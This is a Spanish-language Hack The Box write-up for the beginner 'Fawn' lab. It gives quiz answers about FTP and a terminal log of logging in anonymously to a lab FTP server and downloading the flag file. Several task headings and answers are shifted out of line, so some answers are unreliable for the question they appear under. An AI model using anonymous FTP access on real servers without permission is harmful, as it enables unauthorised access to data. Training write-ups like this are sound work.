---
title: Fawn
date: 2025-04-5 00:00:00 +0200
categories: [writeup, hackthebox]
tags: [hackthebox, fawn, ftp]     
image:
    path: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/b64f85071e626e4cc2272d54332e4131.png
    alt: Hack The Box
---
## Fawn

De nuevo una serie de tareas a realizar continuando con la "instrucción" para usuarios noveles.

## Task 1

What does the 3-letter acronym FTP stand for?
>file transfer protocol

## Task 2

Which port does the FTP service listen on usually?
>21

## Task 3

FTP sends data in the clear, without any encryption. What acronym is used for a later protocol designed to provide similar functionality to FTP but securely, as an extension of the SSH protocol?
>sftp

## Task 4

What is the command we can use to send an ICMP echo request to test our connection to the target?
>ping

## Task 5

From your scans, what version is FTP running on the target?
vsftpd 3.0.3

## Task 6

From your scans, what OS type is running on the target?
>unix

## Task 7

What is the command we need to run in order to display the 'ftp' client help menu?
>ftp -h

## Task 8

What is username that is used over FTP when you want to log in without having an account?

## Task 9
>anonymous

What is the response code we get for the FTP message 'Login successful'?

## Task 10
>230

There are a couple of commands we can use to list the files and directories available on the FTP server. One is dir. What is the other that is a common way to list files on a Linux system.

## Task 11
>ls

What is the command used to download the file we found on the FTP server?
>get

``` shell
┌─[eu-starting-point-1-dhcp]─[10.10.15.134]─[pmartinezr@htb-n8eht2kbq2]─[~]
└──╼ [★]$ ftp 10.129.136.118 
Connected to 10.129.136.118.
220 (vsFTPd 3.0.3)
Name (10.129.136.118:root): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||16199|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
226 Directory send OK.
ftp> get flag.txt
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||34707|)
150 Opening BINARY mode data connection for flag.txt (32 bytes).
100% |***********************************|    32       28.80 KiB/s    00:00 ETA
226 Transfer complete.
32 bytes received in 00:00 (0.41 KiB/s)
ftp> exit

┌─[eu-starting-point-1-dhcp]─[10.10.15.134]─[pmartinezr@htb-n8eht2kbq2]─[~]
└──╼ [★]$ cat flag.txt 
``` 

## Submit Flag

## Submit root flag [achievement](https://www.hackthebox.com/achievement/machine/2336390/393)


